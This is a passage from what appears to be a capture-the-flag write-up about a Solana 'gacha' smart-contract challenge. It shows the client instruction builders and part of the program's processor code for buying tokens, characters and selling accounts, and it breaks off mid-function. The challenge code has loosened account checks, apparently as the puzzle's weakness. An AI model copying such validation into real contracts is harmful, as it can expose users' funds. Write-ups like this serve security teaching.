+            <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new_readonly</span><span class="p">(</span><span class="nn">system_program</span><span class="p">::</span><span class="nf">id</span><span class="p">(),</span> <span class="kc">false</span><span class="p">),</span>
+        <span class="p">],</span>
+        <span class="n">data</span><span class="p">:</span> <span class="nn">GachaInstruction</span><span class="p">::</span><span class="n">CreateUserAccount</span> <span class="p">{</span>
+            <span class="n">account_name</span><span class="p">:</span> <span class="n">account_name</span><span class="nf">.to_string</span><span class="p">(),</span>
+            <span class="n">account_bump</span><span class="p">:</span> <span class="n">useraccount_bump</span><span class="p">,</span>
+        <span class="p">}</span>
+        <span class="nf">.try_to_vec</span><span class="p">()</span>
+        <span class="nf">.unwrap</span><span class="p">(),</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// create a `BuyPrimos` instruction with the user pubkey, the `account_name` and the amount</span>
+<span class="k">pub</span> <span class="k">fn</span> <span class="nf">buy_primos</span><span class="p">(</span><span class="n">program</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span> <span class="n">user</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span> <span class="n">account_name</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span> <span class="n">amount</span><span class="p">:</span> <span class="nb">u64</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="n">Instruction</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="p">(</span><span class="n">useraccount</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="o">=</span> <span class="nf">get_useraccount</span><span class="p">(</span><span class="n">program</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">account_name</span><span class="p">);</span>
+    <span class="k">let</span> <span class="p">(</span><span class="n">vault</span><span class="p">,</span> <span class="n">vault_bump</span><span class="p">)</span> <span class="o">=</span> <span class="nf">get_vault</span><span class="p">(</span><span class="n">program</span><span class="p">);</span>
+    <span class="n">Instruction</span> <span class="p">{</span>
+        <span class="n">program_id</span><span class="p">:</span> <span class="n">program</span><span class="p">,</span>
+        <span class="n">accounts</span><span class="p">:</span> <span class="nd">vec!</span><span class="p">[</span>
+            <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">useraccount</span><span class="p">,</span> <span class="kc">false</span><span class="p">),</span>
+            <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="kc">true</span><span class="p">),</span>
+            <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">vault</span><span class="p">,</span> <span class="kc">false</span><span class="p">),</span>
+            <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new_readonly</span><span class="p">(</span><span class="nn">system_program</span><span class="p">::</span><span class="nf">id</span><span class="p">(),</span> <span class="kc">false</span><span class="p">),</span>
+        <span class="p">],</span>
+        <span class="n">data</span><span class="p">:</span> <span class="nn">GachaInstruction</span><span class="p">::</span><span class="n">BuyPrimos</span> <span class="p">{</span> <span class="n">amount</span><span class="p">,</span> <span class="n">vault_bump</span> <span class="p">}</span>
+            <span class="nf">.try_to_vec</span><span class="p">()</span>
+            <span class="nf">.unwrap</span><span class="p">(),</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// create a `BuyCharacter` instruction with the user pubkey, the `account_name` and the `character_id`</span>
+<span class="k">pub</span> <span class="k">fn</span> <span class="nf">buy_character</span><span class="p">(</span>
+    <span class="n">program</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span>
+    <span class="n">user</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span>
+    <span class="n">account_name</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span>
+    <span class="n">character_id</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+<span class="p">)</span> <span class="k">-&gt;</span> <span class="n">Instruction</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="p">(</span><span class="n">useraccount</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="o">=</span> <span class="nf">get_useraccount</span><span class="p">(</span><span class="n">program</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">account_name</span><span class="p">);</span>
+    <span class="k">let</span> <span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">character_bump</span><span class="p">)</span> <span class="o">=</span> <span class="nf">get_character</span><span class="p">(</span><span class="n">program</span><span class="p">,</span> <span class="n">useraccount</span><span class="p">,</span> <span class="n">character_id</span><span class="p">);</span>
+    <span class="k">let</span> <span class="p">(</span><span class="n">vault</span><span class="p">,</span> <span class="n">vault_bump</span><span class="p">)</span> <span class="o">=</span> <span class="nf">get_vault</span><span class="p">(</span><span class="n">program</span><span class="p">);</span>
+    <span class="n">Instruction</span> <span class="p">{</span>
+        <span class="n">program_id</span><span class="p">:</span> <span class="n">program</span><span class="p">,</span>
+        <span class="n">accounts</span><span class="p">:</span> <span class="nd">vec!</span><span class="p">[</span>
+            <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">useraccount</span><span class="p">,</span> <span class="kc">false</span><span class="p">),</span>
+            <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="kc">true</span><span class="p">),</span>
+            <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="kc">false</span><span class="p">),</span>
+            <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">vault</span><span class="p">,</span> <span class="kc">false</span><span class="p">),</span>
+            <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new_readonly</span><span class="p">(</span><span class="nn">system_program</span><span class="p">::</span><span class="nf">id</span><span class="p">(),</span> <span class="kc">false</span><span class="p">),</span>
+        <span class="p">],</span>
+        <span class="n">data</span><span class="p">:</span> <span class="nn">GachaInstruction</span><span class="p">::</span><span class="n">BuyCharacter</span> <span class="p">{</span>
+            <span class="n">character_id</span><span class="p">,</span>
+            <span class="n">character_bump</span><span class="p">,</span>
+            <span class="n">vault_bump</span><span class="p">,</span>
+        <span class="p">}</span>
+        <span class="nf">.try_to_vec</span><span class="p">()</span>
+        <span class="nf">.unwrap</span><span class="p">(),</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// create a `SellAccount` instruction with the user pubkey, the `account_name` and the `characters` array which contains a list of character id</span>
+<span class="k">pub</span> <span class="k">fn</span> <span class="nf">sell_account</span><span class="p">(</span>
+    <span class="n">program</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span>
+    <span class="n">user</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span>
+    <span class="n">account_name</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span>
+    <span class="n">characters</span><span class="p">:</span> <span class="o">&amp;</span><span class="p">[</span><span class="nb">u8</span><span class="p">],</span>
+<span class="p">)</span> <span class="k">-&gt;</span> <span class="n">Instruction</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="p">(</span><span class="n">useraccount</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="o">=</span> <span class="nf">get_useraccount</span><span class="p">(</span><span class="n">program</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">account_name</span><span class="p">);</span>
+    <span class="k">let</span> <span class="p">(</span><span class="n">vault</span><span class="p">,</span> <span class="n">vault_bump</span><span class="p">)</span> <span class="o">=</span> <span class="nf">get_vault</span><span class="p">(</span><span class="n">program</span><span class="p">);</span>
+
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">accounts</span> <span class="o">=</span> <span class="nd">vec!</span><span class="p">[</span>
+        <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">useraccount</span><span class="p">,</span> <span class="kc">false</span><span class="p">),</span>
+        <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="kc">true</span><span class="p">),</span>
+        <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">vault</span><span class="p">,</span> <span class="kc">false</span><span class="p">),</span>
+    <span class="p">];</span>
+
+    <span class="k">for</span> <span class="o">&amp;</span><span class="n">c</span> <span class="k">in</span> <span class="n">characters</span> <span class="p">{</span>
+        <span class="k">let</span> <span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="o">=</span> <span class="nf">get_character</span><span class="p">(</span><span class="n">program</span><span class="p">,</span> <span class="n">useraccount</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
+        <span class="n">accounts</span><span class="nf">.push</span><span class="p">(</span><span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="k">false</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="n">accounts</span><span class="nf">.push</span><span class="p">(</span><span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new_readonly</span><span class="p">(</span><span class="nn">system_program</span><span class="p">::</span><span class="nf">id</span><span class="p">(),</span> <span class="k">false</span><span class="p">));</span>
+
+    <span class="n">Instruction</span> <span class="p">{</span>
+        <span class="n">program_id</span><span class="p">:</span> <span class="n">program</span><span class="p">,</span>
+        <span class="n">accounts</span><span class="p">:</span> <span class="n">accounts</span><span class="p">,</span>
+        <span class="n">data</span><span class="p">:</span> <span class="nn">GachaInstruction</span><span class="p">::</span><span class="n">SellAccount</span> <span class="p">{</span> <span class="n">vault_bump</span> <span class="p">}</span>
+            <span class="nf">.try_to_vec</span><span class="p">()</span>
+            <span class="nf">.unwrap</span><span class="p">(),</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h4 id="processorrs">processor.rs</h4>
+
+<p>In here we have 5 main functions:</p>
+
+<h5 id="process_instruction"><code class="language-plaintext highlighter-rouge">process_instruction</code></h5>
+<p>Takes the <code class="language-plaintext highlighter-rouge">instrucion_data</code> parameter, deserializes it in a <code class="language-plaintext highlighter-rouge">GachaInstruction</code> used to extract the parameters to call the right function.</p>
+
+<p>The 4 <code class="language-plaintext highlighter-rouge">GachaInstruction</code>s are the following:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">CreateUserAccount</code>, used to create a new user account to store <code class="language-plaintext highlighter-rouge">primos</code> (the challenge tokens) and the <code class="language-plaintext highlighter-rouge">characters</code> (the challenge NFTs);</li>
+  <li><code class="language-plaintext highlighter-rouge">BuyPrimos</code>, used to buy <code class="language-plaintext highlighter-rouge">primos</code> to any <code class="language-plaintext highlighter-rouge">UserAccount</code>;</li>
+  <li><code class="language-plaintext highlighter-rouge">BuyCharacter</code>, used to buy <code class="language-plaintext highlighter-rouge">characters</code> for an amount of <code class="language-plaintext highlighter-rouge">primos</code>;</li>
+  <li><code class="language-plaintext highlighter-rouge">SellAccount</code>, used to sell an <code class="language-plaintext highlighter-rouge">account</code> for <code class="language-plaintext highlighter-rouge">primos</code>.</li>
+</ul>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pub</span> <span class="k">fn</span> <span class="nf">process_instruction</span><span class="p">(</span>
+    <span class="n">program_id</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">Pubkey</span><span class="p">,</span>
+    <span class="n">accounts</span><span class="p">:</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">AccountInfo</span><span class="p">],</span>
+    <span class="k">mut</span> <span class="n">instruction_data</span><span class="p">:</span> <span class="o">&amp;</span><span class="p">[</span><span class="nb">u8</span><span class="p">],</span>
+<span class="p">)</span> <span class="k">-&gt;</span> <span class="n">ProgramResult</span> <span class="p">{</span>
+    <span class="k">match</span> <span class="nn">GachaInstruction</span><span class="p">::</span><span class="nf">deserialize</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">instruction_data</span><span class="p">)</span><span class="o">?</span> <span class="p">{</span>
+        <span class="nn">GachaInstruction</span><span class="p">::</span><span class="n">CreateUserAccount</span> <span class="p">{</span>
+            <span class="n">account_name</span><span class="p">,</span>
+            <span class="n">account_bump</span><span class="p">,</span>
+        <span class="p">}</span> <span class="k">=&gt;</span> <span class="nf">create_useraccount</span><span class="p">(</span><span class="n">program_id</span><span class="p">,</span> <span class="n">accounts</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">account_name</span><span class="p">,</span> <span class="n">account_bump</span><span class="p">),</span>
+        <span class="nn">GachaInstruction</span><span class="p">::</span><span class="n">BuyPrimos</span> <span class="p">{</span> <span class="n">amount</span><span class="p">,</span> <span class="n">vault_bump</span> <span class="p">}</span> <span class="k">=&gt;</span> <span class="p">{</span>
+            <span class="nf">buy_primos</span><span class="p">(</span><span class="n">program_id</span><span class="p">,</span> <span class="n">accounts</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="n">vault_bump</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="nn">GachaInstruction</span><span class="p">::</span><span class="n">BuyCharacter</span> <span class="p">{</span>
+            <span class="n">character_id</span><span class="p">,</span>
+            <span class="n">character_bump</span><span class="p">,</span>
+            <span class="n">vault_bump</span><span class="p">,</span>
+        <span class="p">}</span> <span class="k">=&gt;</span> <span class="nf">buy_character</span><span class="p">(</span>
+            <span class="n">program_id</span><span class="p">,</span>
+            <span class="n">accounts</span><span class="p">,</span>
+            <span class="n">character_id</span><span class="p">,</span>
+            <span class="n">character_bump</span><span class="p">,</span>
+            <span class="n">vault_bump</span><span class="p">,</span>
+        <span class="p">),</span>
+        <span class="nn">GachaInstruction</span><span class="p">::</span><span class="n">SellAccount</span> <span class="p">{</span> <span class="n">vault_bump</span> <span class="p">}</span> <span class="k">=&gt;</span> <span class="p">{</span>
+            <span class="nf">sell_account</span><span class="p">(</span><span class="n">program_id</span><span class="p">,</span> <span class="n">accounts</span><span class="p">,</span> <span class="n">vault_bump</span><span class="p">)</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h5 id="create_useraccount"><code class="language-plaintext highlighter-rouge">create_useraccount</code></h5>
+
+<p>Creates a new <code class="language-plaintext highlighter-rouge">UserAccount</code> with the given <code class="language-plaintext highlighter-rouge">account_name</code>, after checking that the accounts passed are the right ones.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">fn</span> <span class="nf">create_useraccount</span><span class="p">(</span>
+    <span class="n">program</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">Pubkey</span><span class="p">,</span>
+    <span class="n">accounts</span><span class="p">:</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">AccountInfo</span><span class="p">],</span>
+    <span class="n">account_name</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span>
+    <span class="n">account_bump</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+<span class="p">)</span> <span class="k">-&gt;</span> <span class="n">ProgramResult</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">account_iter</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">accounts</span><span class="nf">.iter</span><span class="p">();</span>
+    <span class="k">let</span> <span class="n">useraccount_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">user_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="k">let</span> <span class="n">useraccount_address</span> <span class="o">=</span> <span class="nn">Pubkey</span><span class="p">::</span><span class="nf">create_program_address</span><span class="p">(</span>
+        <span class="o">&amp;</span><span class="p">[</span>
+            <span class="s">b"ACCOUNT"</span><span class="p">,</span>
+            <span class="o">&amp;</span><span class="n">user_info</span><span class="py">.key</span><span class="nf">.to_bytes</span><span class="p">(),</span>
+            <span class="o">&amp;</span><span class="n">account_name</span><span class="nf">.as_bytes</span><span class="p">(),</span>
+            <span class="o">&amp;</span><span class="p">[</span><span class="n">account_bump</span><span class="p">],</span>
+        <span class="p">],</span>
+        <span class="n">program</span><span class="p">,</span>
+    <span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="o">*</span><span class="n">useraccount_info</span><span class="py">.key</span><span class="p">,</span> <span class="n">useraccount_address</span><span class="p">);</span>
+    <span class="nd">assert!</span><span class="p">(</span><span class="n">useraccount_info</span><span class="nf">.data_is_empty</span><span class="p">());</span>
+    <span class="nd">assert!</span><span class="p">(</span><span class="n">user_info</span><span class="py">.is_signer</span><span class="p">);</span>
+
+    <span class="c1">// probably good enough /shrug</span>
+    <span class="k">const</span> <span class="n">ACCOUNT_SIZE</span><span class="p">:</span> <span class="nb">u64</span> <span class="o">=</span> <span class="mi">512</span><span class="p">;</span>
+
+    <span class="nf">invoke_signed</span><span class="p">(</span>
+        <span class="o">&amp;</span><span class="nn">system_instruction</span><span class="p">::</span><span class="nf">create_account</span><span class="p">(</span>
+            <span class="n">user_info</span><span class="py">.key</span><span class="p">,</span>
+            <span class="n">useraccount_info</span><span class="py">.key</span><span class="p">,</span>
+            <span class="mi">10</span><span class="p">,</span>
+            <span class="n">ACCOUNT_SIZE</span><span class="p">,</span>
+            <span class="n">program</span><span class="p">,</span>
+        <span class="p">),</span>
+        <span class="o">&amp;</span><span class="p">[</span><span class="n">user_info</span><span class="nf">.clone</span><span class="p">(),</span> <span class="n">useraccount_info</span><span class="nf">.clone</span><span class="p">()],</span>
+        <span class="o">&amp;</span><span class="p">[</span><span class="o">&amp;</span><span class="p">[</span>
+            <span class="s">b"ACCOUNT"</span><span class="p">,</span>
+            <span class="o">&amp;</span><span class="n">user_info</span><span class="py">.key</span><span class="nf">.to_bytes</span><span class="p">(),</span>
+            <span class="o">&amp;</span><span class="n">account_name</span><span class="nf">.as_bytes</span><span class="p">(),</span>
+            <span class="o">&amp;</span><span class="p">[</span><span class="n">account_bump</span><span class="p">],</span>
+        <span class="p">]],</span>
+    <span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="k">let</span> <span class="n">new_account</span> <span class="o">=</span> <span class="n">UserAccount</span> <span class="p">{</span>
+        <span class="n">primos</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">characters</span><span class="p">:</span> <span class="nn">Vec</span><span class="p">::</span><span class="nf">new</span><span class="p">(),</span>
+        <span class="n">owner</span><span class="p">:</span> <span class="o">*</span><span class="n">user_info</span><span class="py">.key</span><span class="p">,</span>
+    <span class="p">};</span>
+
+    <span class="n">new_account</span><span class="nf">.serialize</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">useraccount_info</span><span class="py">.data</span><span class="nf">.borrow_mut</span><span class="p">()[</span><span class="o">..</span><span class="p">])</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="nf">Ok</span><span class="p">(())</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h5 id="buy_primos"><code class="language-plaintext highlighter-rouge">buy_primos</code></h5>
+
+<p>Uses lamports to buy <code class="language-plaintext highlighter-rouge">primos</code> and adds them to the <code class="language-plaintext highlighter-rouge">UserAccount</code> specified in the input parameters, after checking that the accounts passed are right, it only skips a check on the <code class="language-plaintext highlighter-rouge">user_info.owner</code> because we could potentially buy primos to accounts not owned by us.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">fn</span> <span class="nf">buy_primos</span><span class="p">(</span>
+    <span class="n">program</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">Pubkey</span><span class="p">,</span>
+    <span class="n">accounts</span><span class="p">:</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">AccountInfo</span><span class="p">],</span>
+    <span class="n">amount</span><span class="p">:</span> <span class="nb">u64</span><span class="p">,</span>
+    <span class="n">vault_bump</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+<span class="p">)</span> <span class="k">-&gt;</span> <span class="n">ProgramResult</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">account_iter</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">accounts</span><span class="nf">.iter</span><span class="p">();</span>
+    <span class="k">let</span> <span class="n">useraccount_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">user_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">vault_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">useraccount</span> <span class="o">=</span> <span class="nn">UserAccount</span><span class="p">::</span><span class="nf">deserialize</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="o">&amp;</span><span class="n">useraccount_info</span><span class="py">.data</span><span class="nf">.borrow</span><span class="p">()[</span><span class="o">..</span><span class="p">])</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="k">let</span> <span class="n">vault_address</span> <span class="o">=</span> <span class="nn">Pubkey</span><span class="p">::</span><span class="nf">create_program_address</span><span class="p">(</span><span class="o">&amp;</span><span class="p">[</span><span class="s">b"VAULT"</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">vault_bump</span><span class="p">]],</span> <span class="n">program</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="o">*</span><span class="n">vault_info</span><span class="py">.key</span><span class="p">,</span> <span class="n">vault_address</span><span class="p">);</span>
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="n">useraccount_info</span><span class="py">.owner</span><span class="p">,</span> <span class="n">program</span><span class="p">);</span>
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="n">vault_info</span><span class="py">.owner</span><span class="p">,</span> <span class="n">program</span><span class="p">);</span>
+
+    <span class="c1">// no need to check account owner, since we can let users buy primos for each other</span>
+    <span class="nd">assert!</span><span class="p">(</span><span class="n">user_info</span><span class="py">.is_signer</span><span class="p">);</span>
+
+    <span class="c1">// 1:1 ratio between lamports:primos</span>
+    <span class="nf">invoke</span><span class="p">(</span>
+        <span class="o">&amp;</span><span class="nn">system_instruction</span><span class="p">::</span><span class="nf">transfer</span><span class="p">(</span><span class="n">user_info</span><span class="py">.key</span><span class="p">,</span> <span class="n">vault_info</span><span class="py">.key</span><span class="p">,</span> <span class="n">amount</span><span class="p">),</span>
+        <span class="o">&amp;</span><span class="p">[</span><span class="n">user_info</span><span class="nf">.clone</span><span class="p">(),</span> <span class="n">vault_info</span><span class="nf">.clone</span><span class="p">()],</span>
+    <span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="n">useraccount</span><span class="py">.primos</span> <span class="o">+=</span> <span class="n">amount</span><span class="p">;</span>
+    <span class="n">useraccount</span><span class="nf">.serialize</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">useraccount_info</span><span class="py">.data</span><span class="nf">.borrow_mut</span><span class="p">()[</span><span class="o">..</span><span class="p">])</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="nf">Ok</span><span class="p">(())</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h5 id="buy_character"><code class="language-plaintext highlighter-rouge">buy_character</code></h5>
+
+<p>Create a new account to contain the new <code class="language-plaintext highlighter-rouge">Character</code>, it’s data is copied from the <code class="language-plaintext highlighter-rouge">CHARACTERS</code> array and, after checking that the character is not already present in the <code class="language-plaintext highlighter-rouge">UserAccount</code> and all the accounts passed are right, the <code class="language-plaintext highlighter-rouge">primos</code> are taken from the <code class="language-plaintext highlighter-rouge">UserAccount</code> and the new <code class="language-plaintext highlighter-rouge">character_id</code> gets pushed to the account’s <code class="language-plaintext highlighter-rouge">characters</code> array.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">fn</span> <span class="nf">buy_character</span><span class="p">(</span>
+    <span class="n">program</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">Pubkey</span><span class="p">,</span>
+    <span class="n">accounts</span><span class="p">:</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">AccountInfo</span><span class="p">],</span>
+    <span class="n">character_id</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+    <span class="n">character_bump</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+    <span class="n">vault_bump</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+<span class="p">)</span> <span class="k">-&gt;</span> <span class="n">ProgramResult</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">account_iter</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">accounts</span><span class="nf">.iter</span><span class="p">();</span>
+    <span class="k">let</span> <span class="n">useraccount_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">user_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">character_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">vault_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">useraccount</span> <span class="o">=</span> <span class="nn">UserAccount</span><span class="p">::</span><span class="nf">deserialize</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="o">&amp;</span><span class="n">useraccount_info</span><span class="py">.data</span><span class="nf">.borrow</span><span class="p">()[</span><span class="o">..</span><span class="p">])</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="k">let</span> <span class="n">character_address</span> <span class="o">=</span> <span class="nn">Pubkey</span><span class="p">::</span><span class="nf">create_program_address</span><span class="p">(</span>
+        <span class="o">&amp;</span><span class="p">[</span>
+            <span class="s">b"CHARACTER"</span><span class="p">,</span>
+            <span class="o">&amp;</span><span class="n">useraccount_info</span><span class="py">.key</span><span class="nf">.to_bytes</span><span class="p">(),</span>
+            <span class="o">&amp;</span><span class="p">[</span><span class="n">character_id</span><span class="p">],</span>
+            <span class="o">&amp;</span><span class="p">[</span><span class="n">character_bump</span><span class="p">],</span>
+        <span class="p">],</span>
+        <span class="n">program</span><span class="p">,</span>
+    <span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="nd">msg!</span><span class="p">(</span><span class="s">"{}"</span><span class="p">,</span> <span class="n">character_address</span><span class="p">);</span>
+
+    <span class="k">let</span> <span class="n">vault_address</span> <span class="o">=</span> <span class="nn">Pubkey</span><span class="p">::</span><span class="nf">create_program_address</span><span class="p">(</span><span class="o">&amp;</span><span class="p">[</span><span class="s">b"VAULT"</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">vault_bump</span><span class="p">]],</span> <span class="n">program</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="o">*</span><span class="n">character_info</span><span class="py">.key</span><span class="p">,</span> <span class="n">character_address</span><span class="p">);</span>
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="o">*</span><span class="n">vault_info</span><span class="py">.key</span><span class="p">,</span> <span class="n">vault_address</span><span class="p">);</span>
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="n">useraccount_info</span><span class="py">.owner</span><span class="p">,</span> <span class="n">program</span><span class="p">);</span>
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="n">vault_info</span><span class="py">.owner</span><span class="p">,</span> <span class="n">program</span><span class="p">);</span>
+    <span class="nd">assert!</span><span class="p">(</span><span class="n">character_info</span><span class="nf">.data_is_empty</span><span class="p">());</span>
+
+    <span class="nd">assert!</span><span class="p">(</span><span class="n">user_info</span><span class="py">.is_signer</span><span class="p">);</span>
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="n">useraccount</span><span class="py">.owner</span><span class="p">,</span> <span class="o">*</span><span class="n">user_info</span><span class="py">.key</span><span class="p">);</span>
+
+    <span class="c1">// prevent buying the same character twice</span>
+    <span class="k">for</span> <span class="o">&amp;</span><span class="n">c</span> <span class="k">in</span> <span class="o">&amp;</span><span class="n">useraccount</span><span class="py">.characters</span> <span class="p">{</span>
+        <span class="nd">assert_ne!</span><span class="p">(</span><span class="n">character_id</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
+    <span class="p">}</span>
+
